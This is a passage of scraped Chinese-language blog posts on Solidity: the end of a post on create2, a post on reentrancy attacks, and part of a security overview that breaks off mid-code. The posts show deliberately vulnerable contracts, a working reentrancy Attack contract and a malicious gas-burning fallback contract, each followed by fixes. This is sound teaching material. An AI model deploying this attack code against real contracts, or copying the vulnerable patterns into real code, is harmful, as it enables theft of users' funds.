&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，Factory 合约使用 create2 部署一个 NewContract 合约。通过传入 salt 值，create2 会计算出一个特定的合约地址。这样，你可以在合约部署之前预测合约的地址。合约地址的计算基于 bytecode 和 salt 的哈希，因此只要 salt 和 bytecode 不变，生成的地址也将是固定的。</p>
<h3 id="create-和-create2-的主要区别"><a href="#create-和-create2-的主要区别" class="headerlink" title="create 和 create2 的主要区别"></a>create 和 create2 的主要区别</h3><table>
<thead>
<tr>
<th align="center">特性</th>
<th align="left">create</th>
<th align="left">create2</th>
</tr>
</thead>
<tbody><tr>
<td align="center">地址生成</td>
<td align="left">由 msg.sender 地址和交易 nonce 决定</td>
<td align="left">由 msg.sender 地址、salt 和合约字节码的哈希决定</td>
</tr>
<tr>
<td align="center">预测地址</td>
<td align="left">无法预测合约地址（取决于交易 nonce 和区块时间）</td>
<td align="left">可以在合约部署前预测合约地址</td>
</tr>
<tr>
<td align="center">灵活性</td>
<td align="left">地址不可控制，无法提前决定</td>
<td align="left">可以通过不同的 salt 值控制地址并预先计算</td>
</tr>
<tr>
<td align="center">安全性</td>
<td align="left">地址依赖于交易 nonce，可能会有一定的不确定性</td>
<td align="left">地址可由部署者提前确定，减少了竞争条件</td>
</tr>
<tr>
<td align="center">适用场景</td>
<td align="left">普通合约部署</td>
<td align="left">需要提前知道合约地址的场景</td>
</tr>
<tr>
<td align="center">使用复杂度</td>
<td align="left">简单</td>
<td align="left">需要手动计算字节码和 salt</td>
</tr>
</tbody></table>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a target="_blank" rel="noopener" href="https://learnblockchain.cn/article/7656">使用Create2操作码在相同的地址部署不同的代码的合约</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="博">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Bolog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/" class="post-title-link" itemprop="url">重入攻击</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-11-28 15:03:13 / Modified: 16:09:46" itemprop="dateCreated datePublished" datetime="2024-11-28T15:03:13+08:00">2024-11-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/blockchain/" itemprop="url" rel="index"><span itemprop="name">blockchain</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="重入攻击（Reentrancy-Attack）"><a href="#重入攻击（Reentrancy-Attack）" class="headerlink" title="重入攻击（Reentrancy Attack）"></a>重入攻击（Reentrancy Attack）</h1><p>重入攻击是指攻击者通过调用目标合约的某个函数，利用该函数在完成关键状态变量更新前调用外部合约的能力，从而反复调用目标合约的函数，最终实现非法的资金提取或状态操作。</p>
<h2 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // 存款函数</span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提款函数，存在重入攻击漏洞</span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        // 向用户发送资金</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">        // 更新用户余额</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 合约余额</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个容易受到重入攻击的合约，它允许用户存款并提款。</p>
<p><strong>问题:</strong></p>
<ul>
<li>在发送资金后，余额更新在后。</li>
<li>攻击者可以通过调用自己的回调函数，在 withdraw 执行完成前再次调用 withdraw，从而重复提款。</li>
</ul>
<h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Vulnerable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Vulnerable public vulnerable;</span><br><span class="line"></span><br><span class="line">    constructor(address _vulnerableAddress) &#123;</span><br><span class="line">        vulnerable = Vulnerable(_vulnerableAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 回退函数：用于重入攻击</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (address(vulnerable).balance &gt;= 1 ether) &#123;</span><br><span class="line">            vulnerable.withdraw(1 ether); // 重复调用</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 攻击函数</span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether, &quot;Need at least 1 ether&quot;);</span><br><span class="line">        vulnerable.deposit&#123;value: 1 ether&#125;(); // 存款</span><br><span class="line">        vulnerable.withdraw(1 ether);        // 首次提款</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查看攻击合约余额</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>攻击步骤：</strong></p>
<ol>
<li>攻击者部署 Attack 合约并调用 attack。</li>
<li>调用 vulnerable.withdraw(1 ether) 时触发回退函数 fallback。</li>
<li>回退函数再次调用 withdraw，在余额未更新之前反复提款。</li>
</ol>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><ul>
<li><strong>状态变量优先更新</strong>：在执行外部调用前，先更新合约的状态。</li>
<li><strong>通过加锁来限制重入</strong>：通过给<code>function</code>加锁，来限制重入，以达到防止攻击的目的。</li>
</ul>
<h2 id="状态变量优先更新"><a href="#状态变量优先更新" class="headerlink" title="状态变量优先更新"></a>状态变量优先更新</h2><p>将状态变量的更新移到外部调用之前。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        // 先更新余额，后转账</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="通过加锁来限制重入"><a href="#通过加锁来限制重入" class="headerlink" title="通过加锁来限制重入"></a>通过加锁来限制重入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // 通过加锁来限制重入</span><br><span class="line">    bool private locker = false;</span><br><span class="line">    modifier locked() &#123;</span><br><span class="line">        require(!locker, &quot;reentrant call&quot;);</span><br><span class="line">        locker = true;</span><br><span class="line">        _;</span><br><span class="line">        locker = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public locked &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可通过使用OpenZeppelin中提供的<code>ReentrancyGuard</code>工具来防止攻击，<code>ReentrancyGuard</code>机制与锁机制相同。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Vulnerable is ReentrancyGuard &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public nonReentrant &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2024/11/28/blockchain/ethereum/solidity-security/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="博">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Bolog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/28/blockchain/ethereum/solidity-security/" class="post-title-link" itemprop="url">solidity编程安全</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-28 14:20:13" itemprop="dateCreated datePublished" datetime="2024-11-28T14:20:13+08:00">2024-11-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-04 15:00:42" itemprop="dateModified" datetime="2024-12-04T15:00:42+08:00">2024-12-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/blockchain/" itemprop="url" rel="index"><span itemprop="name">blockchain</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在编写 Solidity 智能合约时，安全性是最重要的考虑因素之一。以下是开发中常见的安全问题及其解决方法：</p>
<h1 id="重入攻击（Reentrancy-Attack）"><a href="#重入攻击（Reentrancy-Attack）" class="headerlink" title="重入攻击（Reentrancy Attack）"></a>重入攻击（Reentrancy Attack）</h1><p><a href="https://zhoubofsy.github.io/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/">https://zhoubofsy.github.io/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/</a></p>
<h1 id="溢出与下溢（Overflow-and-Underflow）"><a href="#溢出与下溢（Overflow-and-Underflow）" class="headerlink" title="溢出与下溢（Overflow and Underflow）"></a>溢出与下溢（Overflow and Underflow）</h1><p><strong>溢出（Overflow）和下溢（Underflow）</strong>是指在处理整数运算时，当结果超出数据类型表示范围时，值会“环绕”到另一端。例如，对于 uint8 类型：</p>
<ul>
<li>溢出： uint8 的最大值是 255，如果执行 255 + 1，值会变为 0。</li>
<li>下溢： uint8 的最小值是 0，如果执行 0 - 1，值会变为 255。</li>
</ul>
<p>在早期的 Solidity 版本中，这种现象常导致严重漏洞，攻击者可以利用这种行为达到意想不到的目的。自 Solidity 0.8 开始，溢出和下溢会触发异常，但了解它们的历史以及如何防范仍然很重要。虽然Solidity 0.8开始增加了溢出检查，这也会导致Gas费用的增加。</p>
<p>在 Solidity 0.8+ 中，每次整数加减运算都会隐式包含溢出检查逻辑，而这种检查需要额外的操作指令，因此会增加运行时消耗的 gas。</p>
<p><strong>Solidity 0.8+</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract OverflowCheck &#123;</span><br><span class="line">    function add(uint256 a, uint256 b) public pure returns (uint256) &#123;</span><br><span class="line">        return a + b; // 含溢出检查</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x00    PUSH1  0x60</span><br><span class="line">0x02    MSTORE</span><br><span class="line">0x03    CALLDATALOAD</span><br><span class="line">0x04    CALLDATALOAD</span><br><span class="line">0x05    ADD         // 加法</span><br><span class="line">0x06    JUMPI       // 检查溢出</span><br><span class="line">0x07    REVERT      // 如果溢出，回滚</span><br><span class="line">0x08    RETURN</span><br></pre></td></tr></table></figure>

<p><strong>Solidity 0.7</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract NoOverflowCheck &#123;</span><br><span class="line">    function add(uint256 a, uint256 b) public pure returns (uint256) &#123;</span><br><span class="line">        return a + b; // 无溢出检查</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x00    PUSH1  0x60</span><br><span class="line">0x02    MSTORE</span><br><span class="line">0x03    CALLDATALOAD</span><br><span class="line">0x04    CALLDATALOAD</span><br><span class="line">0x05    ADD         // 直接加法</span><br><span class="line">0x06    RETURN</span><br></pre></td></tr></table></figure>

<ol>
<li>Solidity 0.8 的溢出检查增加了 ~50 gas 的开销。</li>
<li>增加的开销源于额外的汇编指令（JUMPI 和 REVERT）。</li>
<li>如果对 gas 成本敏感，可以使用 unchecked 块绕过检查，但需确保逻辑安全。</li>
</ol>
<h1 id="未检查的外部调用（Unchecked-External-Call）"><a href="#未检查的外部调用（Unchecked-External-Call）" class="headerlink" title="未检查的外部调用（Unchecked External Call）"></a>未检查的外部调用（Unchecked External Call）</h1><p>“未检查的外部调用”漏洞（Unchecked External Call）是 Solidity 智能合约中的一种常见安全问题。如果智能合约与外部地址交互（比如转账或调用另一个合约的函数）时未检查调用的结果，可能会引发意外的后果和漏洞利用。</p>
<h2 id="潜在问题"><a href="#潜在问题" class="headerlink" title="潜在问题"></a>潜在问题</h2><ol>
<li>失败的调用未被检测<br> 如果调用失败但未进行检查，合约可能会继续执行后续逻辑，从而导致不一致状态或意外行为。<br> 示例问题：转账操作失败，但余额已经从发送方扣除。</li>
<li>错误处理被忽略<br> 外部合约调用可能由于异常（例如合约不存在或代码逻辑错误）而失败。如果不检查返回值，调用方将无法正确处理这些失败。</li>
<li>逻辑漏洞导致资金损失<br> 如果未检查调用结果的返回值，攻击者可以通过故意设计失败的合约逻辑，扰乱调用方合约的资金或状态管理。</li>
<li>影响合约的可组合性<br> 在 DeFi 等应用场景中，不同合约之间通常会进行复杂交互。如果未正确检查外部调用的结果，会影响合约间的协作，甚至破坏整个生态系统的安全性。</li>
</ol>
<p><strong>漏洞示例代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract UncheckedExternalCall &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // 存款功能</span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提现功能，发送资金给用户</span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        // 发送资金，但未检查返回值</span><br><span class="line">        payable(msg.sender).call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">        // 更新余额</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>恶意示例代码</strong><br>攻击者可以部署一个恶意合约，故意使 call 失败（例如，使用耗尽 gas 的回退函数），从而导致 balances 状态不一致。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Malicious &#123;</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">    // 消耗所有 gas，故意让调用失败</span><br><span class="line">        while (true) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>显式检查 call 返回的布尔值，以确保调用成功：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint256 amount) public &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">    // 检查调用结果</span><br><span class="line">    (bool success, ) = payable(msg.sender).call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">    require(success, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] -= amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="随机数生成不安全"><a href="#随机数生成不安全" class="headerlink" title="随机数生成不安全"></a>随机数生成不安全</h1><h2 id="为什么Solidity-中随机数生成不安全？"><a href="#为什么Solidity-中随机数生成不安全？" class="headerlink" title="为什么Solidity 中随机数生成不安全？"></a>为什么Solidity 中随机数生成不安全？</h2><p>在 Solidity 中，常见的随机数生成方式（如依赖区块哈希、时间戳等）容易被攻击者预测或操控：</p>
<ol>
<li>区块哈希依赖（blockhash）： 区块哈希是公开信息，矿工可以选择不挖某些区块，进而影响生成的随机数。</li>
<li>时间戳依赖（block.timestamp）： 矿工可以小幅调整时间戳，使得随机数变为对其有利的值。</li>
<li>合约状态依赖（msg.sender, block.difficulty 等）： 合约状态和交易上下文的信息可以被预测和操控。</li>
</ol>
<p>这些方式在确定性（公开信息和上下文）和可操控性（矿工或攻击者干预）方面不安全。</p>
<h2 id="如何安全生成随机数？"><a href="#如何安全生成随机数？" class="headerlink" title="如何安全生成随机数？"></a>如何安全生成随机数？</h2><ol>
<li>Chainlink VRF:<ul>
<li>可证明公平且可验证的随机数生成器（RNG），它使智能合约能够在不影响安全性或可用性的情况下访问随机值。</li>
<li>建立区块链游戏和NFT</li>
<li>随机分配职责和资源。例如，随机分配法官到案件。</li>
<li>为共识机制选择一个具有代表性的样本。<br> 用法：<a target="_blank" rel="noopener" href="https://docs.chain.link/vrf/v2-5/getting-started">https://docs.chain.link/vrf/v2-5/getting-started</a></li>
</ul>
</li>
<li>Off-chain Randomness (链下随机数)：<ul>
<li>使用链下生成随机数（如通过服务器或 API），然后将结果提交到链上。</li>
<li>缺点：需要信任链下服务，可能会被操控。</li>
<li>改进：通过多方签名或可信执行环境（如 Intel SGX）生成。</li>
</ul>
</li>
<li>Threshold Signature Schemes (TSS)：<ul>
<li>多方合作生成随机数，每方只持有部分秘密信息。</li>
<li>优势：随机数完全由多方参与生成，无法单点操控。</li>
<li>使用场景：像 Chainlink 的去中心化预言机网络。</li>
</ul>
</li>
<li>VDF（Verifiable Delay Function）：<ul>
<li>一种不可预测的随机数生成方式，需要一定时间来计算结果。</li>
<li>优势：矿工无法提前操控随机数。</li>
<li>实现：Ethereum 2.0 的随机数生成设计中引入了 VDF。</li>
</ul>
</li>
</ol>
<h1 id="智能合约升级问题"><a href="#智能合约升级问题" class="headerlink" title="智能合约升级问题"></a>智能合约升级问题</h1><p>智能合约在部署后通常无法直接修改，这可能导致升级和维护困难。如果设计不当，可能需要完全重启项目，从而浪费资源并导致用户信任危机。</p>
<h2 id="解决方案-1：代理合约（Proxy-Pattern）"><a href="#解决方案-1：代理合约（Proxy-Pattern）" class="headerlink" title="解决方案 1：代理合约（Proxy Pattern）"></a>解决方案 1：代理合约（Proxy Pattern）</h2><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>通过代理模式将合约分为两部分：</p>
<ol>
<li>代理合约（Proxy）： 存储状态变量，负责将用户请求委托给逻辑合约。</li>
<li>逻辑合约（Logic&#x2F;Implementation）： 包含实际的业务逻辑，可以升级和替换。</li>
</ol>
<p>用户总是与代理合约交互，代理通过 delegatecall 将调用转发到逻辑合约，使用代理合约的存储保持状态一致。</p>
<h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><ol>
<li>UUPS Proxy<ul>
<li>使用 upgradeTo 方法直接升级逻辑合约。</li>
<li>更加轻量，但需要实现升级逻辑。</li>
</ul>
</li>
<li>Transparent Proxy<ul>
<li>避免管理员调用代理时出现冲突。</li>
<li>管理员可升级逻辑合约，用户调用时自动转发。</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 